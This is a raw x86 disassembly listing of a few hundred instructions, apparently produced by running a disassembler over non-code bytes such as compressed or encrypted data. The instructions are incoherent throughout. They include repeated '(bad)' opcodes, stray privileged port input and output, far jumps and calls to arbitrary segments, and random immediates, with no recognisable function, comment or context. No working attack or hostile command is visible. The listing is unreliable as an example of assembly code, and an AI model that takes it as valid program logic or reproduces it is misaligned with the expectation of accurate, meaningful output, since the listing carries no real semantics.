  41b9bc:	(bad)  
  41b9be:	stos   BYTE PTR es:[edi],al
  41b9bf:	mov    ah,0xfb
  41b9c1:	pop    ebp
  41b9c2:	cmp    DWORD PTR [edi-0xf],0x93e7c635
  41b9c9:	pop    ss
  41b9ca:	sub    al,0x41
  41b9cc:	stos   DWORD PTR es:[edi],eax
  41b9cd:	outs   dx,DWORD PTR ds:[esi]
  41b9ce:	adc    eax,0x1176d8b5
  41b9d3:	shl    DWORD PTR [ecx],1
  41b9d5:	scas   al,BYTE PTR es:[edi]
  41b9d6:	and    al,BYTE PTR [edx+0x47a576e2]
  41b9dc:	test   al,0xd
  41b9de:	fld    DWORD PTR [edi-0x9]
  41b9e1:	das    
  41b9e2:	sbb    al,0x79
  41b9e4:	nop
  41b9e5:	outs   dx,BYTE PTR ds:[esi]
  41b9e6:	popw   ss
  41b9e8:	jmp    0x41b9f5
  41b9ea:	bound  esp,QWORD PTR [edi-0x75570eda]
  41b9f0:	fs cmc 
  41b9f2:	les    edi,FWORD PTR [esi]
  41b9f4:	popa   
  41b9f5:	sub    al,0xf4
  41b9f7:	popa   
  41b9f8:	and    ecx,0xffffffa2
  41b9fb:	into   
  41b9fc:	xchg   edx,eax
  41b9fd:	loop   0x41b9e4
  41b9ff:	jmp    0x5291:0x953473b2
  41ba06:	test   BYTE PTR [eiz*8+0x602b2bb2],0x97
  41ba0e:	retf   
  41ba0f:	mov    esp,0x38071980
  41ba14:	inc    ebx
  41ba15:	out    dx,eax
  41ba16:	mov    al,0x7
  41ba18:	sub    bh,BYTE PTR [ebx+0x73fc6a78]
  41ba1e:	je     0x41ba99
  41ba20:	arpl   WORD PTR [edx-0x758114cf],di
  41ba26:	fdiv   QWORD PTR [eax]
  41ba28:	nop
  41ba29:	lea    ebx,[ecx+0x4850974f]
  41ba2f:	and    ebp,DWORD PTR [edi-0x1]
  41ba32:	aad    0xad
  41ba34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba35:	push   cs
  41ba36:	cmp    dh,BYTE PTR [ebx-0x15]
  41ba39:	and    esp,DWORD PTR [edx-0x37]
  41ba3c:	stos   DWORD PTR es:[edi],eax
  41ba3d:	in     al,0x5f
  41ba3f:	repz out 0x37,eax
  41ba42:	dec    edx
  41ba43:	inc    ecx
  41ba44:	and    al,0xa0
  41ba46:	or     dh,BYTE PTR [edi+eax*8+0x2f]
  41ba4a:	jge    0x41ba27
  41ba4c:	lods   eax,DWORD PTR ds:[esi]
  41ba4d:	cdq    
  41ba4e:	jns    0x41b9fb
  41ba50:	mov    bl,0x74
  41ba52:	rcl    BYTE PTR [esi],1
  41ba54:	gs push ds
  41ba56:	out    0xd4,al
  41ba58:	xor    eax,0x15fe776
  41ba5d:	stos   BYTE PTR es:[edi],al
  41ba5e:	lods   al,BYTE PTR ds:[esi]
  41ba5f:	adc    DWORD PTR [ecx],eax
  41ba61:	sub    BYTE PTR ds:0x417156d4,bl
  41ba67:	and    al,0xbc
  41ba69:	shl    ch,cl
  41ba6b:	in     eax,dx
  41ba6c:	inc    esi
  41ba6d:	jno    0x41ba4d
  41ba6f:	or     edx,0xffffffea
  41ba72:	sbb    BYTE PTR [edi+0x3b],cl
  41ba75:	jecxz  0x41bae8
  41ba77:	call   0xf8ee2140
  41ba7c:	gs (bad) 
  41ba7e:	mov    eax,ds:0x6d6f6e5e
  41ba83:	punpckhdq mm6,QWORD PTR [ecx*2+0x30f5609a]
  41ba8b:	adc    BYTE PTR [ebx+0x61d25a40],al
  41ba91:	lods   eax,DWORD PTR ds:[esi]
  41ba92:	sub    BYTE PTR [eax+0x4],ch
  41ba95:	jg     0x41bb04
  41ba97:	cld    
  41ba98:	arpl   WORD PTR [edi+0x24],dx
  41ba9b:	cmp    eax,0xbed6032b
  41baa0:	aas    
  41baa1:	cmp    BYTE PTR [ecx+0x7ea449e2],0xe1
  41baa8:	repnz adc dl,BYTE PTR [edi-0x47]
  41baac:	or     al,0x94
  41baae:	mov    ch,0x9f
  41bab0:	ins    BYTE PTR es:[edi],dx
  41bab1:	rcl    DWORD PTR [ecx+0x7b1a3572],0x8f
  41bab8:	es sahf 
  41baba:	(bad)  
  41babb:	out    0x35,al
  41babd:	push   cs
  41babe:	cld    
  41babf:	mov    esi,0x27e0e1ad
  41bac4:	in     eax,dx
  41bac5:	retf   0x2a47
  41bac8:	cmp    bh,bh
  41baca:	cmc    
  41bacb:	arpl   WORD PTR [esi+eax*8+0x6b],bx
  41bacf:	add    eax,DWORD PTR [ebp-0x1d413330]
  41bad5:	and    eax,0xe92d7d2f
  41bada:	dec    esp
  41badb:	fwait
  41badc:	inc    ebx
  41badd:	mov    dl,0xa9
  41badf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bae0:	adc    eax,0x3687fb07
  41bae5:	sbb    eax,0x3bcc1cda
  41baea:	cmp    eax,0xcd156caf
  41baef:	aam    0xcb
  41baf1:	sbb    DWORD PTR [edi],0x968f897e
  41baf7:	nop
  41baf8:	out    dx,al
  41baf9:	pop    ecx
  41bafa:	add    eax,0x8655356f
  41baff:	pop    eax
  41bb00:	test   al,dl
  41bb02:	push   ecx
  41bb03:	dec    esp
  41bb04:	or     al,0x86
  41bb06:	adc    esi,eax
  41bb08:	mov    bh,0xca
  41bb0a:	inc    ecx
  41bb0b:	dec    edi
  41bb0c:	sbb    eax,0x1f9de821
  41bb11:	int3   
  41bb12:	xor    al,BYTE PTR [esi-0x39]
  41bb15:	(bad)  
  41bb16:	cld    
  41bb17:	or     DWORD PTR [ebp-0x2708be7f],0xffffffb0
  41bb1e:	pop    ds
  41bb1f:	inc    edx
  41bb20:	mov    DWORD PTR [edi],eax
  41bb22:	mov    ah,0xe2
  41bb24:	mov    eax,0x93192648
  41bb29:	sub    ebx,edi
  41bb2b:	push   edi
  41bb2c:	mov    DWORD PTR [edx],ecx
  41bb2e:	xchg   edi,eax
  41bb2f:	int3   
  41bb30:	pop    ebx
  41bb31:	fstp   QWORD PTR [edi]
  41bb33:	jle    0x41bade
  41bb35:	mov    ch,0xf6
  41bb37:	mov    dl,0x16
  41bb39:	sbb    esi,esi
  41bb3b:	push   esp
  41bb3c:	test   DWORD PTR [ecx+0x6e],ebx
  41bb3f:	and    BYTE PTR [ebx-0x58],dl
  41bb42:	retf   
  41bb43:	js     0x41bb16
  41bb45:	cmp    esp,DWORD PTR [ecx]
  41bb47:	and    eax,esi
  41bb49:	ins    DWORD PTR es:[edi],dx
  41bb4a:	fsubp  st(6),st
  41bb4c:	adc    eax,DWORD PTR [ecx+ecx*2+0x48]
  41bb50:	retf   
  41bb51:	pop    ecx
  41bb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb53:	cmp    al,0x4
  41bb55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb56:	xor    BYTE PTR [edi-0x42],dh
  41bb59:	jmp    0x41bbd7
  41bb5b:	lock (bad) 
  41bb5d:	sub    DWORD PTR [esi-0x27],esp
  41bb60:	mov    ds:0xdb8d0ee0,al
  41bb65:	sbb    al,0xea
  41bb67:	aad    0x89
  41bb69:	xor    al,BYTE PTR [edx+0x26]
  41bb6c:	jmp    0xf1c9:0x983355b0
  41bb73:	jp     0x41bbcb
  41bb75:	pop    eax
  41bb76:	jecxz  0x41bb6e
  41bb78:	push   cs
  41bb79:	or     BYTE PTR [eax-0x4fe51dbc],0x56
  41bb80:	cwde   
  41bb81:	mov    dl,0x34
  41bb83:	mov    WORD PTR [ecx-0x6e],?
  41bb86:	fcomp  QWORD PTR [ebx+0x4f]
  41bb89:	repz add DWORD PTR [esi],ebx
  41bb8c:	sub    DWORD PTR [esi-0xd8886b1],ecx
  41bb92:	pushf  
  41bb93:	mov    edi,0x66e3cec3
  41bb98:	loopne 0x41bb58
  41bb9a:	fnstcw WORD PTR [ecx+0x36aa53ad]
  41bba0:	jno    0x41bba9
  41bba2:	sub    eax,0x2a0d2bb
  41bba7:	test   eax,0x25758ee5
  41bbac:	jmp    0x6d9d8f81
  41bbb1:	add    BYTE PTR [esi+0xbe55235],0xfe
  41bbb8:	btc    DWORD PTR [edi-0x3f897523],esp
  41bbbf:	add    eax,0x48e32a5f
  41bbc4:	jae    0x41bbeb
  41bbc6:	pop    ds
  41bbc7:	(bad)  
  41bbc8:	and    ebx,eax
  41bbca:	mov    ebx,0x2544c02d
  41bbcf:	rcl    DWORD PTR [edx],1
  41bbd1:	data16 cld 
  41bbd3:	add    al,0x91
  41bbd5:	dec    esi
  41bbd6:	mov    ds,WORD PTR [ebp+0x3b]
  41bbd9:	dec    edi
  41bbda:	or     edi,edx
  41bbdc:	pop    edx
  41bbdd:	and    BYTE PTR [ecx-0x1ae5fedf],bh
  41bbe3:	dec    ebp
  41bbe4:	fistp  QWORD PTR [ebx-0x674694b1]
  41bbea:	sbb    eax,0x8f1f3826
  41bbef:	out    dx,al
  41bbf0:	out    dx,eax
  41bbf1:	in     al,dx
  41bbf2:	pop    esp
  41bbf3:	pop    es
  41bbf4:	in     eax,0xc5
  41bbf6:	inc    esp
  41bbf7:	xchg   esp,eax
  41bbf8:	push   esi
  41bbf9:	cmp    dh,BYTE PTR [ecx-0x13]
  41bbfc:	sub    DWORD PTR [eax+0x2a],ebp
  41bbff:	pop    esp
  41bc00:	sahf   
  41bc01:	or     bh,BYTE PTR ds:0x6954a260
  41bc07:	ret    0xa0aa
  41bc0a:	mov    dl,0x8f
  41bc0c:	sbb    ch,bl
  41bc0e:	sub    al,0xf1
  41bc10:	mov    al,0xb5
  41bc12:	cld    
  41bc13:	pop    ebx
  41bc14:	push   cs
  41bc15:	mov    dl,0x9b
  41bc17:	cmc    
  41bc18:	popa   
  41bc19:	addr16 mov ch,0x75
  41bc1c:	cs push ds
  41bc1e:	(bad)  
  41bc1f:	retf   
  41bc20:	cli    
  41bc21:	push   0xe77f75fd
  41bc26:	cmp    eax,0x6c0bcaea
  41bc2b:	dec    ebp
  41bc2c:	adc    al,0xfa
  41bc2e:	adc    al,0x87
  41bc30:	call   0x8b3d:0x1d14778
  41bc37:	repnz out 0xa8,eax
  41bc3a:	stos   BYTE PTR es:[edi],al
  41bc3b:	inc    ecx
  41bc3c:	inc    esp
  41bc3d:	cmp    BYTE PTR [ebp+0x25],bl
  41bc40:	retf   0x50a0
  41bc43:	into   
  41bc44:	sbb    DWORD PTR [ebp-0x211bc4d7],eax
  41bc4a:	xor    edi,DWORD PTR [edx-0x36]
  41bc4d:	push   0xffffffa5
  41bc4f:	pop    ecx
  41bc50:	add    edi,ebp
  41bc52:	adc    esi,DWORD PTR [ebp+0x7f]
  41bc55:	mov    ch,BYTE PTR [eax]
  41bc57:	inc    ecx
  41bc58:	out    dx,al
  41bc59:	enter  0xb340,0xef
  41bc5d:	xor    bh,BYTE PTR [ebx]
  41bc5f:	gs jns 0x41bc7c
  41bc62:	cmp    cl,bh
  41bc64:	sbb    ebp,DWORD PTR [eax-0x52373bf9]
  41bc6a:	ds inc si
  41bc6d:	jbe    0x41bc73
  41bc6f:	or     dh,BYTE PTR [eax]
  41bc71:	pop    eax
  41bc72:	jmp    0xa9bb79ac
  41bc77:	lods   eax,DWORD PTR ds:[esi]
  41bc78:	sub    BYTE PTR [ebx+ebp*8-0x7adc1bec],bl
  41bc7f:	or     eax,0x8e394746
  41bc84:	lods   eax,DWORD PTR ds:[esi]
  41bc85:	mov    BYTE PTR [ebx-0x5671ad2a],dh
  41bc8b:	imul   esi,DWORD PTR [edi],0xc
  41bc8e:	dec    ebp
  41bc8f:	mov    ch,0x9f
  41bc91:	push   ebx
  41bc92:	dec    ecx
  41bc93:	push   ds
  41bc94:	ja     0x41bc1a
  41bc96:	test   al,0x9
  41bc98:	out    0x63,eax
  41bc9a:	push   ss
  41bc9b:	gs or  eax,0xb33b4b3
  41bca1:	add    eax,0xa060005e
  41bca6:	cmp    edx,DWORD PTR [edi+0x6b]
  41bca9:	je     0x41bceb
  41bcab:	jl     0x41bcda
  41bcad:	add    ecx,ebp
  41bcaf:	push   0x8c4bb02a
  41bcb4:	(bad)  
  41bcb5:	shl    bl,1
  41bcb7:	pop    esi
  41bcb8:	push   ds
  41bcb9:	push   esp
  41bcba:	mov    ah,0xf0
  41bcbc:	loopne 0x41bd0f
  41bcbe:	(bad)  
  41bcbf:	add    ebx,DWORD PTR [ebx+ebp*2+0x5f]
  41bcc3:	pop    edx
  41bcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcc5:	jns    0x41bd2f
  41bcc7:	pushf  
  41bcc8:	test   al,0x6c
  41bcca:	stos   BYTE PTR es:[edi],al
  41bccb:	je     0x41bc60
  41bccd:	das    
  41bcce:	cmp    eax,0xebce477c
  41bcd3:	sbb    esp,esp
  41bcd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcd6:	mov    edi,0x7824956a
  41bcdb:	repnz enter 0x7efb,0xf7
  41bce0:	fisubr WORD PTR ds:0x5337aa59
  41bce6:	sbb    esi,DWORD PTR [eax]
  41bce8:	js     0x41bd48
  41bcea:	cmc    
  41bceb:	mov    WORD PTR [esp+ecx*2],?
  41bcee:	daa    
  41bcef:	imul   esi,DWORD PTR [edx-0x7bdf2162],0x234a461d
  41bcf9:	sbb    bh,bl
  41bcfb:	daa    
  41bcfc:	fcomp  st(7)
  41bcfe:	ds mov esp,0x6256de87
  41bd04:	xchg   edi,eax
  41bd05:	fwait
  41bd06:	inc    ecx
  41bd07:	in     eax,0xc8
  41bd09:	ins    DWORD PTR es:[edi],dx
  41bd0a:	imul   ecx,DWORD PTR [edx+0x614493a3],0xfffffff3
  41bd11:	jne    0x41bd81
  41bd13:	test   eax,0xaede7d4d
  41bd18:	and    eax,0x19aec9cd
  41bd1d:	out    dx,al
  41bd1e:	cmp    al,0x6c
  41bd20:	mov    di,0x16ab
  41bd24:	sbb    al,0xd0
  41bd26:	mov    ch,0x8a
  41bd28:	ret    0xc637
  41bd2b:	sbb    esi,DWORD PTR [ebp+0x12]
  41bd2e:	sub    DWORD PTR [edx-0x38],0x5078fa46
  41bd35:	push   esp
  41bd36:	fadd   QWORD PTR [ecx+0x4bfec044]
  41bd3c:	enter  0xc04c,0x66
  41bd40:	adc    al,0xa6
  41bd42:	arpl   WORD PTR ds:0x52334edd,cx
  41bd48:	test   BYTE PTR [ecx],dh
  41bd4a:	pop    ebx
  41bd4b:	pop    es
  41bd4c:	xor    BYTE PTR [edi-0x39],0xb3
  41bd50:	(bad)  
  41bd51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd52:	sar    BYTE PTR [eax-0x3e714425],0x8a
  41bd59:	inc    ecx
  41bd5a:	sub    al,0x5c
  41bd5c:	xchg   esi,eax
  41bd5d:	out    dx,al
  41bd5e:	sbb    BYTE PTR [ebx-0x680b576],dh
  41bd64:	mov    dl,0x41
  41bd66:	xchg   BYTE PTR [ebx-0x37],bl
  41bd69:	test   eax,0x6758be6
  41bd6e:	inc    esi
  41bd6f:	dec    esp
  41bd70:	jbe    0x41bd9d
  41bd72:	mov    BYTE PTR [edx+eiz*4+0x78e2d810],cl
  41bd79:	mov    edx,0x9dbc075c
  41bd7e:	xchg   edx,eax
  41bd7f:	mov    ebp,0xc1cded32
  41bd84:	es cld 
  41bd86:	mov    dl,0x5
  41bd88:	icebp  
  41bd89:	fist   WORD PTR [ecx+0x375c0002]
  41bd8f:	fiadd  DWORD PTR [eax-0x3]
  41bd92:	jns    0x41bd28
  41bd94:	mov    al,0x75
  41bd96:	je     0xdcb3fd5e
  41bd9c:	adc    eax,DWORD PTR [edx]
  41bd9e:	shr    BYTE PTR [ebp-0x3],0x1e
  41bda2:	sbb    al,0xbf
  41bda4:	out    0x60,eax
  41bda6:	or     esp,DWORD PTR [eax+0x558ab932]
  41bdac:	call   0xee496755
  41bdb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdb2:	and    ch,BYTE PTR [ebp-0x7f565e79]
  41bdb8:	adc    BYTE PTR [edi-0x50],ch
  41bdbb:	aaa    
  41bdbc:	fst    st(1)
  41bdbe:	sbb    al,0x2
  41bdc0:	aad    0x24
  41bdc2:	shl    DWORD PTR [esi+0x10b9fb56],1
  41bdc8:	cmp    ebp,eax
  41bdca:	imul   edi,DWORD PTR [esi],0xd2858060
  41bdd0:	pop    ss
  41bdd1:	xchg   al,bl
  41bdd3:	and    BYTE PTR [ebp-0x53ab2ddb],al
  41bdd9:	mov    ebx,0xb69ab1f2
  41bdde:	ficom  WORD PTR [eax+0x401042ec]
  41bde4:	sub    al,0x48
  41bde6:	aas    
  41bde7:	test   BYTE PTR [edx-0x29640280],al
  41bded:	into   
  41bdee:	jbe    0x41be4e
  41bdf0:	or     DWORD PTR [ebx+edx*2],esp
  41bdf3:	loope  0x41be2a
  41bdf5:	popa   
  41bdf6:	mov    ebx,0x6eb086f2
  41bdfb:	rcl    DWORD PTR [esp+ebp*2],cl
  41bdfe:	push   0x7a
  41be00:	dec    edi
  41be01:	pop    eax
  41be02:	xor    DWORD PTR [edx+0x4b],eax
  41be05:	sub    esp,DWORD PTR [edx+0x1dfdd668]
  41be0b:	popa   
  41be0c:	fld    DWORD PTR [ecx-0x4e]
  41be0f:	add    ecx,DWORD PTR [edi+0x10ecb86]
  41be15:	sbb    ah,0xa5
  41be18:	jge    0x41bdff
  41be1a:	or     al,0xa8
  41be1c:	inc    ebp
  41be1d:	cmc    
  41be1e:	or     edi,DWORD PTR [eax]
  41be20:	pop    edx
  41be21:	or     edi,DWORD PTR [eax+eiz*1-0x7d]
  41be25:	cmp    DWORD PTR [edx+0x3b3bbfeb],eax
  41be2b:	cli    
  41be2c:	out    dx,al
  41be2d:	je     0x41be72
  41be2f:	aad    0xd2
  41be31:	sahf   
  41be32:	mov    dh,0xb3
  41be34:	outs   dx,BYTE PTR ds:[esi]
  41be35:	outs   dx,DWORD PTR ds:[esi]
  41be36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be37:	mov    ds:0xdda3abca,al
  41be3c:	(bad)  
  41be3d:	shl    DWORD PTR [esi+0x18098e4f],1
  41be43:	ficomp WORD PTR [ebx-0x64]
  41be46:	push   edi
  41be47:	iret   
  41be48:	std    
  41be49:	(bad)  
  41be4a:	or     cl,BYTE PTR [ebx+0x19764c10]
  41be50:	sbb    DWORD PTR [ebx-0x9],0xffffffe5
  41be54:	xlat   BYTE PTR ds:[ebx]
  41be55:	ds push ds
  41be57:	pop    ds
  41be58:	imul   ebx,DWORD PTR [edi+ebx*2+0x1419ed61],0x761c7e82
  41be63:	int3   
  41be64:	xor    al,0x3d
  41be66:	mov    ecx,0x51d08ff
  41be6b:	icebp  
  41be6c:	jmp    0x41bec0
  41be6e:	xchg   DWORD PTR [edi+edx*1+0x6e],esp
  41be72:	rcr    ebp,1
  41be74:	fmul   DWORD PTR [eax]
  41be76:	mov    BYTE PTR [esi+0x31],cl
  41be79:	adc    BYTE PTR [ebx],cl
  41be7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be7c:	mov    WORD PTR [edi-0x2b],ss
  41be7f:	xlat   BYTE PTR ds:[ebx]
  41be80:	sysexit 
  41be82:	xor    DWORD PTR [edx],edi
  41be84:	retf   0x7923
  41be87:	imul   esi,DWORD PTR [eax+0x6ae8f4b4],0xfffffff9
  41be8e:	pop    ecx
  41be8f:	pop    ecx
  41be90:	ja     0x41bed8
  41be92:	inc    esi
  41be93:	cdq    
  41be94:	xor    eax,0x877fb7a6
  41be99:	ds or  ch,ch
  41be9c:	enter  0x32c,0xa4
  41bea0:	outs   dx,BYTE PTR ds:[esi]
  41bea1:	push   esp
  41bea2:	mov    BYTE PTR [esi+0x2a5c95ed],al
  41bea8:	sbb    eax,0x81f9767
  41bead:	inc    eax
  41beae:	cmc    
  41beaf:	jmp    0x41be3c
  41beb1:	daa    
  41beb2:	aam    0x7d
  41beb4:	lock idiv DWORD PTR [ecx+eiz*1-0x5b]
  41beb9:	adc    BYTE PTR [ebp-0x3e],bh
  41bebc:	push   edi
  41bebd:	jbe    0x41be80
  41bebf:	fmul   DWORD PTR [esi-0x3]
  41bec2:	mov    cl,0x75
  41bec4:	stc    
  41bec5:	cmp    ah,ah
  41bec7:	pop    ss
  41bec8:	jb     0x41bedf
  41beca:	cmp    DWORD PTR [edi+edi*2],esi
  41becd:	outs   dx,DWORD PTR ds:[esi]
  41bece:	in     al,0xfa
  41bed0:	stc    
  41bed1:	push   esi
  41bed2:	test   al,0x4c
  41bed4:	sbb    ebx,DWORD PTR ds:0xed94df18
  41beda:	scas   al,BYTE PTR es:[edi]
  41bedb:	push   ds
  41bedc:	bound  edx,QWORD PTR [ebp*4+0x55255e13]
  41bee3:	xor    bh,dh
  41bee5:	rcr    DWORD PTR [edx-0x72],cl
  41bee8:	dec    ecx
  41bee9:	dec    esi
  41beea:	sub    ah,BYTE PTR ds:0x5a12942a
  41bef0:	sbb    eax,0x478eeba6
  41bef5:	mov    esi,0x91031118
  41befa:	arpl   WORD PTR [esi-0x32],ax
  41befd:	xor    eax,0x3ceb6c98
  41bf02:	sbb    ebp,ebx
  41bf04:	aaa    
  41bf05:	push   eax
  41bf06:	std    
  41bf07:	mov    bl,0x87
  41bf09:	add    eax,0x79d8ee0c
  41bf0e:	in     eax,0x9b
  41bf10:	jg     0x41bf8b
  41bf12:	ret    
  41bf13:	mov    dl,0x34
  41bf15:	add    cl,BYTE PTR [esi]
  41bf17:	push   ss
  41bf18:	and    BYTE PTR [ebp+0x5e957f3f],dl
  41bf1e:	or     edx,esp
  41bf20:	xchg   ebp,eax
  41bf21:	dec    esi
  41bf22:	(bad)  
  41bf23:	jmp    0x5791:0x163e78db
  41bf2a:	fmul   DWORD PTR [edx-0x5e]
  41bf2d:	dec    ebp
  41bf2e:	dec    edx
  41bf2f:	lea    esi,[ebx+ecx*4-0x631a1f85]
  41bf36:	dec    esp
  41bf37:	jno    0x41bf99
  41bf39:	lahf   
  41bf3a:	xchg   DWORD PTR [edi],edx
  41bf3c:	jle    0x41bfb5
  41bf3e:	mov    cl,0x17
  41bf40:	lods   al,BYTE PTR ds:[esi]
  41bf41:	jle    0x41bfa4
  41bf43:	imul   edi,esi,0x499abc1b
  41bf49:	inc    ebp
  41bf4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf4b:	push   ecx
  41bf4c:	stos   DWORD PTR es:[edi],eax
  41bf4d:	inc    ebx
  41bf4e:	mov    DWORD PTR [edi-0x598fa85b],esp
  41bf54:	and    ch,BYTE PTR [edx+eiz*2]
  41bf57:	and    esi,esp
  41bf59:	jle    0x41bfa1
  41bf5b:	pop    ebp
  41bf5c:	mov    esp,0xf8d2b8e9
  41bf61:	jne    0x41bf4b
  41bf63:	inc    ecx
  41bf64:	mov    ecx,0x28829f16
  41bf69:	mov    ebp,DWORD PTR [esi-0x4]
  41bf6c:	in     al,0xe2
  41bf6e:	ins    BYTE PTR es:[edi],dx
  41bf6f:	cmp    eax,0x34d5a7d0
  41bf74:	push   0x1fa1c957
  41bf79:	shl    DWORD PTR [ecx-0x166e28f7],0x8d
  41bf80:	inc    ebx
  41bf81:	addr16 test al,0x86
  41bf84:	push   ebx
  41bf85:	hlt    
  41bf86:	enter  0x5ef7,0x19
  41bf8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf8b:	pop    ss
  41bf8c:	or     bl,0xe3
  41bf8f:	add    BYTE PTR [edi+0x9],ah
  41bf92:	es adc eax,0x7729832c
  41bf98:	inc    eax
  41bf99:	push   edi
  41bf9a:	sub    al,0x65
  41bf9c:	jp     0x41c014
  41bf9e:	push   eax
  41bf9f:	add    BYTE PTR [esi],0x28
  41bfa2:	sub    edx,DWORD PTR [ecx]
  41bfa4:	add    esi,esp
  41bfa6:	movlps xmm3,QWORD PTR [ebp+0x42191923]
  41bfad:	outs   dx,BYTE PTR ds:[esi]
  41bfae:	clc    
  41bfaf:	ins    BYTE PTR es:[edi],dx
  41bfb0:	in     al,0x8d
  41bfb2:	mov    ebp,?
  41bfb4:	sbb    esp,eax
  41bfb6:	jbe    0x41bf97
  41bfb8:	dec    edx
  41bfb9:	push   ebx
  41bfba:	js     0x41bf7b
  41bfbc:	cmp    eax,0x86787468
  41bfc1:	adc    DWORD PTR ds:[edx-0x53],ecx
  41bfc5:	stc    
  41bfc6:	cli    
  41bfc7:	mov    eax,0xa68f094
  41bfcc:	pop    edi
  41bfcd:	and    esi,edi
  41bfcf:	into   
  41bfd0:	jae    0x41c021
  41bfd2:	jge    0x41c01e
  41bfd4:	mov    BYTE PTR ds:0xcc9692b6,cl
  41bfda:	push   edx
  41bfdb:	pop    eax
  41bfdc:	clc    
  41bfdd:	inc    DWORD PTR [ecx+esi*8]
  41bfe0:	jns    0x41c01c
  41bfe2:	(bad)  
  41bfe3:	jg     0x41bfb6
  41bfe5:	pop    esp
  41bfe6:	mov    al,ds:0x82d678ec
  41bfeb:	loope  0x41bffb
  41bfed:	ss scas al,BYTE PTR es:[edi]
  41bfef:	pop    ebp
  41bff0:	imul   edx,DWORD PTR [ebp+0x45],0x50
  41bff4:	sbb    al,0xfc
  41bff6:	call   0x269a:0x4c1250e
  41bffd:	jae    0x41c025
  41bfff:	and    BYTE PTR [edi-0x65],0x15
  41c003:	call   0x3606:0x70082dd1
  41c00a:	inc    eax
  41c00b:	popf   
  41c00c:	and    bh,BYTE PTR [eax]
  41c00e:	xor    ecx,DWORD PTR [edi]
  41c010:	add    BYTE PTR [eax+0x6],al
  41c013:	cld    
  41c014:	std    
  41c015:	sbb    bl,ah
  41c017:	test   ax,0xb6a0
  41c01b:	jmp    0xa9cc:0xa2e9
  41c021:	pop    esi
  41c022:	dec    edx
  41c023:	inc    ebp
  41c025:	gs jb  0x41c09a
  41c028:	adc    dl,BYTE PTR [edi]
  41c02a:	sbb    edx,edi
  41c02c:	ror    DWORD PTR [esp+ebp*4+0xd],0x3f
  41c031:	dec    edx
  41c032:	shl    BYTE PTR [edi+0x46],cl
  41c035:	call   0x77ff3cbd
  41c03a:	xor    al,0xf9
  41c03c:	in     al,dx
  41c03d:	dec    ebx
  41c03e:	cmp    eax,0x8aee1be9
  41c043:	clc    
  41c044:	xor    al,0x12
  41c046:	jmp    0x1917:0x82425c7e
  41c04d:	leave  
  41c04e:	mov    esp,0x340fe50e
  41c053:	jne    0x41c0cb
  41c055:	lods   al,BYTE PTR ds:[esi]
  41c056:	xchg   edi,eax
  41c057:	out    0x28,al
  41c059:	ja     0x41c025
  41c05b:	cmp    ebp,DWORD PTR [eax+ecx*4-0x73]
  41c05f:	inc    eax
  41c060:	ret    0xa413
  41c063:	gs xor al,0xa6
  41c066:	pop    ss
  41c067:	mov    eax,0xb0c63bfd
  41c06c:	arpl   WORD PTR [ebp+ecx*4-0x73],cx
  41c070:	mov    ah,0xf1
  41c072:	int3   
  41c073:	push   ecx
  41c074:	and    BYTE PTR [ecx+0x68170dd6],al
  41c07a:	aas    
  41c07b:	push   cs
  41c07c:	popa   
  41c07d:	fs push es
  41c07f:	push   ds
  41c080:	xchg   ebx,eax
  41c081:	push   ebx
  41c082:	(bad)  
  41c083:	(bad)  
  41c084:	inc    esp
  41c085:	loope  0x41c01a
  41c087:	or     DWORD PTR [esi+0x7a],eax
  41c08a:	mov    edi,0xa06409be
  41c08f:	aas    
  41c090:	sbb    al,0x4b
  41c092:	sbb    DWORD PTR [eax-0x6c246fc8],esp
  41c098:	mov    ebp,DWORD PTR ds:0xd22d823
  41c09e:	fs sub al,0xd
  41c0a1:	push   edi
  41c0a2:	das    
  41c0a3:	pop    esp
  41c0a4:	sub    al,BYTE PTR [ecx]
  41c0a6:	cmp    eax,0x83a029b
  41c0ab:	stos   DWORD PTR es:[edi],eax
  41c0ac:	sbb    DWORD PTR [edi+eiz*2+0x8],edi
  41c0b0:	or     DWORD PTR [edi-0x46f5035d],ecx
  41c0b6:	mov    al,BYTE PTR [eax+edx*2-0x1e9f7e65]
  41c0bd:	cld    
  41c0be:	push   0xffffffdb
  41c0c0:	rcr    DWORD PTR [ebp+edx*8-0xa],0x1c
  41c0c5:	lods   al,BYTE PTR ds:[esi]
  41c0c6:	xchg   ebx,eax
  41c0c7:	iret   
  41c0c8:	xchg   ebp,eax
  41c0c9:	fimul  WORD PTR [eax]
  41c0cb:	adc    eax,0x6d791e2e
  41c0d0:	pop    ebx
  41c0d1:	data16 xor al,0x54
  41c0d4:	shl    edi,cl
  41c0d6:	mov    al,0xcc
  41c0d8:	sub    DWORD PTR [eax],esp
  41c0da:	out    0xd5,al
  41c0dc:	ins    DWORD PTR es:[edi],dx
  41c0dd:	call   0x7f63:0x72266593
  41c0e4:	add    eax,0x931489d1
  41c0e9:	push   es
  41c0ea:	inc    edx
  41c0eb:	rcl    BYTE PTR [ebx-0x78],1
  41c0ee:	pop    ebx
  41c0ef:	call   0xdf6c:0x69a09b80
  41c0f6:	ss sub al,0xd7
  41c0f9:	mov    dh,0x76
  41c0fb:	mov    al,ds:0xdc59f8c
  41c100:	mov    eax,0x7a21e0fe
  41c105:	imul   esi,DWORD PTR [ecx],0x6
  41c108:	mov    esi,0x1615787a
  41c10d:	adc    ebp,DWORD PTR [ebp+0x1e179d9b]
  41c113:	lds    edx,FWORD PTR [esi]
  41c115:	hlt    
  41c116:	sbb    esp,DWORD PTR [ebx-0x7909938d]
  41c11c:	cmp    BYTE PTR [edx+0x6e21f707],bh
  41c122:	or     ecx,DWORD PTR [ecx]
  41c124:	ss std 
  41c126:	push   cs
  41c127:	xchg   DWORD PTR [edi-0x4626993d],edx
  41c12d:	je     0x41c137
  41c12f:	inc    edi
  41c130:	or     eax,0xc8f756a6
  41c135:	shl    al,1
